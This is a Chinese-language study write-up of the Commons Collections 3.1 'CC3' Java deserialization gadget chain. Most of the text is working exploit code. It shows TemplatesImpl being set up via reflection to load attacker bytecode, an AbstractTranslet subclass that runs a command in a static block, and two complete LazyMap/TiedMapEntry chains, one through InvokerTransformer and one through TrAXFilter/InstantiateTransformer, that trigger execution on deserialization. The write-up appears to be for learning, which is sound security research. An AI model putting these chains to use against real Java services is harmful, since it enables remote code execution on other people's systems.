# CommonsCollections3分析

## 1.环境搭建

```xml
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.1</version>
</dependency>
```

## 2.调试分析

### 2.1 链子1

这个链子的**Sink**与CC1相同，通过反射调用到`TemplatesImpl#newTransformer()`实现动态类加载。

首先分析一下`TemplatesImpl`中的代码,部分代码如下：

```java
private void defineTransletClasses()
throws TransformerConfigurationException {

if (_bytecodes == null) {
    ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
    throw new TransformerConfigurationException(err.toString());
}

TransletClassLoader loader = (TransletClassLoader)
    AccessController.doPrivileged(new PrivilegedAction() {
        public Object run() {
            return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
        }
    });
...

    for (int i = 0; i < classCount; i++) {
        _class[i] = loader.defineClass(_bytecodes[i]);
        final Class superClass = _class[i].getSuperclass();

        // Check if this is the main class
        if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
            _transletIndex = i;
        }
...
}
```

在上述代码中涉及到2个关键变量:1.`_bytecodes` 2. `_tfactory` 在调用的过程中还会涉及到一个变量：3.`_name`.

关键的代码调用在于`loader.defineClass(_bytecodes[i])`,在这边的话需要了解一些关于类加载知识，简单来说，**调用到该位置后，可以在运行中利用字节码加载一个类。**

加载的这个类还必须满足`superClass.getName().equals(ABSTRACT_TRANSLET)`，也就是父类是`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`.

了解以上的点之后，利用反射通过`TemplatesImple`构造一个命令执行：

```java
TemplatesImpl templates = new TemplatesImpl();
Class<?> templatesClass = templates.getClass();
Field _name = templatesClass.getDeclaredField("_name");
_name.setAccessible(true);
_name.set(templates,"aaaa");
//=================================================================
Field _tfactory = templatesClass.getDeclaredField("_tfactory");
_tfactory.setAccessible(true);
_tfactory.set(templates,new TransformerFactoryImpl());
//=================================================================
Field _bytecodes = templatesClass.getDeclaredField("_bytecodes");
_bytecodes.setAccessible(true);

byte[] code = Files.readAllBytes(Paths.get("/Users/java/Exp.class"));
byte[][] byteCodes = {code};
_bytecodes.set(templates,byteCodes);

templates.newTransformer();
```

还需要定义一个exp的类，然后编译出class文件：

```java
public class Exp extends AbstractTranslet {
public Exp() {
}

public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
}

public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
}

static {
    try {
        Runtime.getRuntime().exec("open -a calculator");
    } catch (IOException var1) {
        throw new RuntimeException(var1);
    }
}
}
```

然后就可以触发命令执行，根据上述的点在与CC1部分链子进行拼接。

```java
TemplatesImpl templates = new TemplatesImpl();
Class<?> templatesClass = templates.getClass();
Field _name = templatesClass.getDeclaredField("_name");
_name.setAccessible(true);
_name.set(templates,"aaaa");
//===============================================================
Field _tfactory = templatesClass.getDeclaredField("_tfactory");
_tfactory.setAccessible(true);
_tfactory.set(templates,new TransformerFactoryImpl());
//===============================================================
Field _bytecodes = templatesClass.getDeclaredField("_bytecodes");
_bytecodes.setAccessible(true);

byte[] code = Files.readAllBytes(Paths.get("/Users/me7eorite/Documents/GitHub/Learning-Demo/JavaStudy/target/classes/com/learning/security/serialization/commons/Exp.class"));
byte[][] byteCodes = {code};
_bytecodes.set(templates,byteCodes);



//==================方式一========================================

ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
        new ConstantTransformer(templates),
        new InvokerTransformer("newTransformer",new Class[]{},new Object[]{})
});

HashMap<Object, Object> hashMap1 = new HashMap<>();
hashMap1.put("123","123");
Map decorate = LazyMap.decorate(hashMap1, chainedTransformer);

TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, "123");

//=================方式二==========================================

  //InvokerTransformer newTransformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
  //HashMap<Object, Object> hashMap1 = new HashMap<>();
  //hashMap1.put(templates,"123");
  //Map decorate = LazyMap.decorate(hashMap1, newTransformer);

  //TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, templates);

//=================================================================

HashMap<Object, Object> hashMap2 = new HashMap<>();
hashMap2.put(tiedMapEntry,"123");
decorate.clear();

byte[] serialize = serialize(hashMap2);
unSerialize(serialize);
```

### 2.2 链子2

如果Sink不利用反射调用有没有其它的方式？答案是有的。

利用`InstantiateTransformer#transform`调用后，会触发`xxx.newInstance(args)`,通过`TrAXFilte#init`方法，触发`xxx.newTransformer()`。

```java
    TemplatesImpl templates = new TemplatesImpl();
    Class<?> templatesClass = templates.getClass();
    Field _name = templatesClass.getDeclaredField("_name");
    _name.setAccessible(true);
    _name.set(templates,"aaaa");
//=================================================================
    Field _tfactory = templatesClass.getDeclaredField("_tfactory");
    _tfactory.setAccessible(true);
    _tfactory.set(templates,new TransformerFactoryImpl());
//=================================================================
    Field _bytecodes = templatesClass.getDeclaredField("_bytecodes");
    _bytecodes.setAccessible(true);

    byte[] code = Files.readAllBytes(Paths.get("/Users/mxxx/Exp.class"));
    byte[][] byteCodes = {code};
    _bytecodes.set(templates,byteCodes);

    ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
            new ConstantTransformer(TrAXFilter.class),
            new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
    });

    HashMap<Object, Object> hashMap1 = new HashMap<>();
    hashMap1.put("123","123");
    Map decorate = LazyMap.decorate(hashMap1, chainedTransformer);

    TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, "123");

    HashMap<Object, Object> hashMap2 = new HashMap<>();
    hashMap2.put(tiedMapEntry,"123");
    decorate.clear();

    byte[] serialize = serialize(hashMap2);
    unSerialize(serialize);

```

## 3.调用图

![image-20240331193352090](./img/image-20240331193352090.png)











